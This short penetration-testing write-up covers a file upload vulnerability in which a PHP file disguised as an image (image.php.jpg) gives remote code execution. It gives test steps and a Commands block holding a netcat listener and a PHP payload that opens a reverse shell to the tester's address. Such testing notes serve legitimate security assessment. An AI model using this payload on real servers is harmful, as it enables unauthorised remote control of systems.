## Use case

The file upload feature of the application was vulnerable because it allowed the upload of a PHP file disguised as an image, leading to remote code execution on the server.

## Steps to test

1. Identify the file upload feature of the web application.
2. Attempt to upload a file with a .php extension disguised as an image (e.g., image.php.jpg).
3. Monitor the server response to confirm the upload was successful.
4. Set up a listener on your local machine (e.g., using netcat: nc -lvnp <port>).
5. Access the uploaded file via its URL to execute a reverse shell command (e.g., <?php system('nc <your_ip> <port> -e /bin/bash'); ?>).
6. Check your listener for a connection from the server.

## Commands

```text
nc -lvnp <port>
<?php system('nc <your_ip> <port> -e /bin/bash'); ?>
```
